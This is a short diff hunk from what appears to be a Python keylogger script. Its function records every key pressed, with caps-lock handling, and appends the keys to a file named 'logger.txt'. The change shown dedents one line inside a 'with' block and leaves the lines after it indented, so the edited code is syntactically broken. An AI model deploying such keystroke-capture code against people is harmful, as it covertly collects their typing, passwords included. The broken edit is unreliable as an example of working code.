@@ -5,7 +5,7 @@ is_capslock = False
 def logkeys(key):
     global is_capslock
     with open('logger.txt','a+') as f:
-        log = str(key).strip('\'').lower()
+    log = str(key).strip('\'').lower()
         if key == keyboard.Key.caps_lock:
             if is_capslock == False:
                 log = str(key).strip('\'').upper()
